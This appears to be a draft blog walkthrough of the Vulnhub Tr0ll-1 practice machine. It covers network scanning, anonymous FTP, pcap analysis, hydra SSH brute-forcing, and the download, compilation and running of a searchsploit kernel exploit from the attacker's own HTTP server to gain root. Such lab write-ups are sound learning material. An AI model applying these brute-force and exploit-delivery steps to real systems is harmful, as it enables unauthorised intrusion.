---
title: 'Vulnhub: Tr0ll-1 Walkthrough'
date: '2019-05-30T13:06:55+05:30'
draft: true
autoThumbnailImage: true
---
Tr0ll1 OS can be found at <https://www.vulnhub.com/entry/tr0ll-1,100/> and is one of the many available already vulnerable, fun for hacking machines. These machines are vulnerable by default for pen testers and beginners to try their hands on.

This is how the machine looks like when run in VMware.

![]()

Now as with any machine, network scanning and enumeration is very important. To find the IP address of the target machine, I used 

arp-scan –l

\-l stands for local scan and ARP is the abbreviation for Address Resolution Protocol.

![]()

Now that I have run the command, we can see that 4 IP addresses are being displayed:

192.168.183.1 is the Default Gateway of the router

192.168.183.2 is the Default Gateway for VMware 

192.168.183.254 is the Broadcast Channel which broadcasts on the whole network

192.168.183.136 is the target IP address, Tr0ll-1 here.

I know now, the IP address of the target machine, so I can do an aggressive port scan using Network Mapper(nmap) for determining the versions of the services being run on ports and other information. 

nmap –A –Pn <IP address>

\-A for aggressive scan and –Pn to scan all machines even ones that don’t respond.

![]()

From the output of the aforementioned command, we can see that there are three open ports, 21 for ftp, 22 for ssh and 80 for http. Also, Anonymous FTP login is allowed and a file named “lol.pcap” in found on the ftp server. Under robots.txt file, on web server we find a disallowed directory named /secret and can be tried to access. 

Now since http is working on port 80, I tried to access the website hosted on the IP address of the machine. 

![]()

Here I found nothing but just an image and upon further checking for steganography, it showed no results. So, nothing new here.

![]()

Upon further diving into the website, I found a directory named /secret in the robots.txt file. This file, robots.txt is used to prevent web spiders (eg: google crawler showing it in search results) from accessing information inside the disallowed directories which might be confidential.

Now, opening the directory I just found, I find nothing but another troll image. 

![]()

Trying another approach, since I found nothing in the previous one, I remember that anonymous login was allowed on the ftp server so, I connect to the ftp server on the target machine using the command

ftp <target IP address>

![]()

Command ls is used to list all the files inside the directory.

ls

![]()

Now here I found the same file as that mentioned in the aggressive network scan I did before.

To work further upon the file, I copied it to my own machine using the command

get <filename> <local path to download  the file to>

If we don’t add the local path to download the file to, it is by default saved in the /root directory with the same name.

![]()

Now that we have successfully downloaded the file onto our machine we can see what is the utility it is used for, now I already know that .pcap files are usually wireshark saved files. Wireshark is a tool, pre-installed inside kali linux, it is a free and open-source packet analyser used for network analysis, protocol developments and much more.

Wireshark has a GUI based environment and we open the file we just downloaded from the target machine.

Wireshark > File > Open > /root/file.pcap > Open

![]()

The below is how Wireshark interface looks like, it is divided into various tab for easy access and functionality. Further more the workspace is divided into three subparts, the first showing the count and type of all the packets, second showing the protocol information and Human Level Language data, the third layer only shows the complete data being sent inside each packet that is being analysed.

![]()

I now looked for any hints I could find inside the lol.pcap file we found on the ftp server of the vulnerable troll machine.

![]()

Here I found a packet stating something about a secret_stuff.txt file, I tried to find it on the webserver but it turns out it wasn’t of much importance. 

![]()

What I also found is another FTP DATA packer saying something about a “sup3rs3cr3tdirlol” named file or directory.

So after trying it, there existed a directory on the web server with the same name.

![]()

You can see that there was a file named roflmao in the directory, I downloaded it to the /root directory (default) using 

wget <file address>

![]()

Since the file has no extension I just tried to read it string-wise, using the linux command

strings <filename>

![]()

Another little hint hidden here was the “0x0856BF”, the first possibility of this string was to be another directory on the web server. So, I tried for just the same: 

![]()

Here I found two folders, as you can see above. Now the contents of these are shown below.

![]()

The “good_luck” named folder contained a text file with contents below.

![]()

The first most probable guess was this is a list of usernames which can be brute forced.

![]()

On the other hand, the other directory too had a text file named Pass.txt and containing “Good\_job\_:)” 

![]()

I downloaded both the files using wget command.

![]()

![]()

Once downloaded, I edited the text files using a GUI based pre-installed text editor and removed the extra un-required text in the file containing usernames most probably. Also, since the other folder read “this_folder_contains_the_password”, just as another safety measure, I also added the name of the text file “Pass.txt” in the list of probable passwords.

After that was done, the task was now to brute force these supposed credentials that we had, to do that, I used the tool named hydra, which is one of the best and fastest brute forcing tools available in Kali. I brute forced the SSH protocol running on port 22.

hydra –L <username list> -P <password list> ssh://<IP of target machine> -V  (for verbose)

Upon running the commands successfully, we find the brute forced username and password as “overflow” and “Pass.txt”. This proves the importance of taking hints since the filename was the password itself. 

Using these credentials I tried logging in using SSH.

ssh <username>@<host address>

The credentials successfully logged me in, now I could do some discovery in the target machine itself using basic linux commands.

Now that I had access to the directories, I checked the release version of the presently running operating system and find if it has any vulnerability I can exploit to gain root access.

We use the following command to check the release date and version 

cat /etc/*-release

Now that I knew the version of the operating system I searched for the exploits available for the same using the tool searchsploit in Kali

searchsploit ubuntu 14.04

Here I have highlighted the exploit which I thought was best to use, it’s a privilege escalation exploit I can use to gain root access from any normal user. 

I now copied the exploit file to the present working directory i.e. /root using the command

searchsploit –m <exploit file name> 

Now that I have copied the file to the working directory, I host a simple http server in the same directory using the command

python –m SimpleHTTPServer

(it’s a case sensitive command)

Once I have successfully hosted the server in the directory, I can now download this exploit onto the host machine using the normal user access I had through ssh and then execute the exploit to gain root access.

Now, most web servers or machines do not allow file transfer or creation in any folder due to obvious security reasons but they often do have a temporary where one can download or create or copy files to, I just used the same directory to download the exploit to using the following commands

cd tmp		(to change the directory to /tmp/)

wget <IP address of the machine you hosted the server on>/<exploit file present in the same dir>

ls		(to list the files in the directory)		

gcc <exploit file name> -o <name of the executable payload to generated>

Now I checked again to confirm the executable payload as been generated and is ready to exploit.

To run the executable exploit, 

./<executable payload file name>

After the execution I saw a “#” symbol which signified I have successfully gained root access. I further typed the command “bash” to make the interface more use-able.

To further check it, I also use commands like “whoami” and “id” to confirm root access.
